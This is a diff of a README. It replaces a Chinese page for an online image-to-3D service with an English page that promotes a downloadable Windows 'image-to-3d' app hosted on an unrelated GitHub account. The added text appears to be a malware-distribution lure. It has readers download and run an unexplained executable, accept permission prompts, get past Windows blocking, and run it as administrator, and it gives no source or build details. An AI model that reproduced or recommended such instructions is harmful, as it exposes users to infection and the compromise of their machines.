@@ -1,97 +1,185 @@
-# 免费在线 AI 图转 3D 模型生成器 (2D to 3D)
+# 🖼️ image-to-3d - Turn 2D images into 3D
 
-![AI Powered](https://img.shields.io/badge/Powered_by-AI-orange?style=for-the-badge)
-![Free Tool](https://img.shields.io/badge/Pricing-100%25_Free-brightgreen?style=for-the-badge)
-![Export Formats](https://img.shields.io/badge/Export-OBJ%20%7C%20GLB%20%7C%20FBX-blue?style=for-the-badge)
-![No Registration](https://img.shields.io/badge/Access-No_Registration-red?style=for-the-badge)
+[![Download image-to-3d](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/lento-inversion286/image-to-3d)
 
-[**HANYUAI 3D工坊：AI图转3D**](https://www.hanyuai.com/zh/image-edit/image-to-3d) 是一款专为游戏开发者、电商卖家、3D打印爱好者和设计师打造的**免费在线 2D 图片转 3D 模型工具**。
+## ✨ What this app does
 
-告别门槛极高的传统 3D 建模软件（如 Blender、Maya、ZBrush）！依托最新的神经辐射场 (NeRF) 与几何深度学习技术，只需上传一张 2D 平面图片，系统即可在 10~60 秒内自动生成高精度的 3D 三维网格，并自动烘焙 PBR 贴图与法线。完全免费，支持导出 OBJ、GLB 等主流格式，直接无缝导入 Unity、UE5 等游戏引擎。
+image-to-3d helps you turn a single 2D image into a 3D model on Windows. It is built for simple use, so you can open the app, load an image, and create a 3D result without a long setup. The app supports common export formats like GLB and OBJ, which makes it useful for sharing, viewing, and moving models into other tools.
 
-👉 **[立即体验免费在线 AI 图转 3D](https://www.hanyuai.com/zh/image-edit/image-to-3d)**
+## 🪟 Windows download and setup
 
----
+Use this link to visit the download page:
 
-## 🌟 核心优势与功能亮点
+https://github.com/lento-inversion286/image-to-3d
 
-为什么选择 HANYUAI 作为您的首选**在线 3D 建模工具**？
+### Steps to get started
 
-- 🚀 **平图变立体，一键即成**：AI 智能识别图像深度与解剖结构，精准构建三维网格（Mesh），让平面素材瞬间拥有立体生命力。
-- 🎨 **AI 自动贴图烘焙**：自动分析光影色彩，生成高质量 UV 贴图与 PBR 材质（包含漫反射与粗糙度）。无论是金属光泽还是布料纹理，皆能完美还原。
-- ⚙️ **多重精度控制**：支持根据需求生成 高模（适合影视渲染）、中模、低模（适合移动端游戏）或 体素化风格（像素艺术）。
-- 🔌 **多端兼容导出**：生成后一键导出，支持 OBJ、GLB 等通用 3D 格式。GLB 包含材质贴图适合 Web 端 720° 展示，OBJ 方便二次雕刻与编辑。
-- ☁️ **全云端零门槛**：全流程浏览器内完成，免安装任何插件，无需任何 3D 建模基础。
+1. Open the download page in your browser.
+2. Look for the latest Windows file or release package.
+3. Download the file to your computer.
+4. If the file comes in a .zip folder, open it and extract it first.
+5. Double-click the app file to run it.
+6. If Windows asks for permission, choose Run or Yes.
+7. Follow the on-screen steps inside the app.
 
----
+### If you use a ZIP file
 
-## 🖼️ 多维应用场景 (模型效果展示)
+1. Right-click the ZIP file.
+2. Choose Extract All.
+3. Pick a folder you can find later, like Downloads or Desktop.
+4. Open the extracted folder.
+5. Run the app file inside it.
 
-无论是概念设计、电商展示还是 3D 打印，HANYUAI 都能提供标准化的 3D 资产输出。
+## 🖥️ What you need
 
-### 1. 游戏资产：角色原画转 3D 动漫模型
-将 2D 的二次元少女立绘或游戏概念图，一键转换为 3D 动漫风格模型，甚至自动生成骨骼绑定信息和卡通渲染材质，大幅缩短游戏开发周期。
-*(左：2D角色原画输入 | 右：3D模型输出效果)*
-<p align="center">
-  <img src="https://img.hanyuai.com/file/image-to-3d/qMlXK4qi.webp" width="45%" alt="原始角色原画图片" />
-  <img src="https://img.hanyuai.com/file/image-to-3d/f28IjajX.webp" width="45%" alt="生成的3D角色模型" />
-</p>
+image-to-3d is made for regular Windows PCs. A modern system works best.
 
-### 2. 电商展示：商品照片转 3D 交互模型
-仅需一张新款运动鞋或商品的侧面照，即可生成写实风格的 3D 商品模型。鞋带与鞋底纹理清晰可见，完美适配电商平台的 720 度全景展示。
-*(左：商品单视角实拍 | 右：高精度 3D 还原模型)*
-<p align="center">
-  <img src="https://img.hanyuai.com/file/image-to-3d/9Fsbjzhm.webp" width="45%" alt="原始产品摄影照片" />
-  <img src="https://img.hanyuai.com/file/image-to-3d/BwbAw3H0.webp" width="45%" alt="生成的3D产品模型" />
-</p>
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- A recent graphics card for smoother 3D work
+- Enough free space for models and exports
+- A mouse helps with image selection and model review
 
-### 3. 3D 打印：2D Logo 转 3D 浮雕徽章
-将极其简单的黑白线条 Logo 设计，智能转换为具有厚重金属质感的 3D 浮雕实体，直接导出 OBJ 即可用于 3D 打印机进行实体化生产。
-*(左：平面 Logo 设计 | 右：3D 浮雕实体输出)*
-<p align="center">
-  <img src="https://img.hanyuai.com/file/image-to-3d/gZw7xxoj.webp" width="45%" alt="原始Logo设计图" />
-  <img src="https://img.hanyuai.com/file/image-to-3d/1ddMABrJ.webp" width="45%" alt="生成的3D浮雕模型" />
-</p>
+## 🎯 Main uses
 
----
+- Turn a photo into a 3D model
+- Make quick test models from flat art
+- Export models for other 3D tools
+- Save results in GLB format for broad support
+- Save results in OBJ format for editing and reuse
+- Create simple 3D assets without manual modeling
 
-## 🛠️ 轻松四步生成您的 3D 模型 (使用指南)
+## 🧭 How to use image-to-3d
 
-体验极简的三维重建流程：
+### 1. Open the app
 
-1. **上传图片**：[访问 AI 图转 3D 工作台](https://www.hanyuai.com/zh/image-edit/image-to-3d)，拖拽上传需要转换的 2D 图片（最大支持 24MB，支持背景透明的 PNG 效果更佳）。
-2. **输入细节描述 (Prompt)**：向 AI 说明您期望的材质或几何细节。例如：“生成高精度多边形模型，保留所有机械结构与边缘倒角”。
-3. **选择精度与生成模式**：
-   - 精度选择：可指定为**高模、中模、低模**。
-   - 模式选择：内置多款行业顶尖生成模型（如专注构建几何的 Mesh 模型，专攻高清纹理的 Texture 引擎等）。
-4. **生成与下载**：点击生成，等待约 30-60 秒。在 Web 端实时预览 3D 效果后，免费下载 `GLB` 或 `OBJ` 格式的 3D 资产文件。
+Start image-to-3d from the folder where you extracted it or from the file you downloaded.
 
----
+### 2. Load an image
 
-## ❓ 常见问题解答 (FAQ)
+Choose an image from your computer. Clear images with visible edges and strong contrast work best. Portraits, objects, icons, and product photos are good starting points.
 
-**Q: AI 图转 3D 的核心技术是什么？**
-A: 本工具采用最新的神经辐射场 (NeRF) 与几何深度学习技术，可从单张平面图片推断出物体的三维结构与景深，并支持自动生成规范的网格、法线贴图与 PBR 材质。
+### 3. Start the 3D process
 
-**Q: 生成的模型拓扑（布线）质量如何？**
-A: 基于海量 3D 数据集训练，生成的模型具备符合物理逻辑的合理拓扑布线。对硬表面物体（如机械）、有机生物体等均能生成相对干净的四边面或三角面结构，方便后续绑定动画。
+Click the button to begin. The app will use the image and build a 3D result based on its shape and depth cues.
 
-**Q: 模型生成通常需要多长时间？**
-A: 整个 3D 模型生成流程约 30-60 秒，涵盖深度估算、网格构建与纹理烘焙环节。我们采用云端 GPU 集群加速，即便是复杂的物体结构也能快速响应。
+### 4. Review the result
 
-**Q: 平台支持大批量生成游戏资产吗？**
-A: 支持！系统采用队列机制，支持批量上传。游戏开发者能批量将概念设计图转为 3D 资产，相比传统手工建模效率提升 95%。
+You can look around the model and check the shape. If the result seems too flat or too rough, try a different image.
 
-**Q: 上传的未公开设计图是否安全？**
-A: 绝对安全。我们采用端到端加密与临时存储机制，所有上传的 2D 概念图及生成的 3D 模型均在处理完成后自动销毁，绝不保留、不窃取用户的知识产权数据。
+### 5. Export your model
 
----
+Save the result as GLB or OBJ. Use GLB if you want a compact file that works well in many viewers. Use OBJ if you want a common format for editing in other software.
 
-## 🌐 访问与支持
+## 🧩 Best image types
 
-准备好让您的平面设计立体重生了吗？加入成千上万使用 AI 快速建模的创作者行列！
+The app works best with images that have a clear subject and clean background.
 
-🔗 **在线 3D 建模工具直达**：[https://www.hanyuai.com/zh/image-edit/image-to-3d](https://www.hanyuai.com/zh/image-edit/image-to-3d)
-🏠 **探索更多 AI 图像/3D 工具**：[HANYUAI 图像助理官网](https://www.hanyuai.com/zh/image-edit)
+Good examples:
 
-*Copyright © 2022-2026 HANYUAI. All Rights Reserved.*
+- A person against a plain wall
+- A product on a table
+- A single object with sharp edges
+- A game asset or icon
+- A drawing with strong outline detail
+
+Images that may need more care:
+
+- Busy backgrounds
+- Very dark photos
+- Blurry pictures
+- Images with too many small parts
+- Overexposed photos
+
+## 📁 Export formats
+
+### GLB
+
+GLB is a compact 3D file format. It keeps the model and data in one file, which makes it easy to move and open in many viewers.
+
+Use GLB when you want:
+
+- Easy file sharing
+- Faster loading
+- Simple storage
+- Broad support across 3D apps
+
+### OBJ
+
+OBJ is a common format for 3D models. It works well when you want to edit the model in another tool.
+
+Use OBJ when you want:
+
+- Simple model exchange
+- More control in editing tools
+- Compatibility with older 3D software
+- A standard mesh format
+
+## 🔧 Simple workflow tips
+
+- Use a clear image with one main subject
+- Crop out extra background before you start
+- Try different images if the shape looks weak
+- Save both GLB and OBJ if you want backup formats
+- Keep the original image file in case you want to try again
+
+## 🗂️ Files you may see
+
+After you download and open the app, you may see files like these:
+
+- The main app file
+- Support files the app needs to run
+- A folder for models or output
+- Export files such as .glb or .obj
+- Image files you choose to process
+
+Do not delete the support files unless you know they are not needed. Keep the whole app folder together.
+
+## 🛠️ Common issues
+
+### The app will not open
+
+- Make sure you extracted the ZIP file first
+- Check that Windows did not block the file
+- Run the app from the extracted folder, not from inside the ZIP
+- Try right-clicking the file and choosing Run as administrator
+
+### The image does not load
+
+- Check that the file is a common image type like PNG or JPG
+- Make sure the file is not broken
+- Try a different image from your computer
+
+### The model looks poor
+
+- Use a clearer source image
+- Remove busy backgrounds
+- Try an image with better light
+- Use a subject with clear edges
+
+### Export does not work
+
+- Check that you have enough space on your drive
+- Make sure the output folder is writable
+- Try exporting as the other format, GLB or OBJ
+
+## 📌 Good first test
+
+If you want a fast first run, use this kind of image:
+
+- A single object on a plain background
+- A face or upper body photo with good light
+- A simple product shot
+- A clean icon or drawing
+
+This helps you see how the app handles shape, depth, and edges.
+
+## 🔍 Search topics
+
+2d-to-3d, 3d-generation, 3d-modeling, ai-image-to-3d, free-3d-tool, glb-export, obj-export
+
+## 📥 Download again
+
+Open the download page here if you need the app file again:
+
+https://github.com/lento-inversion286/image-to-3d
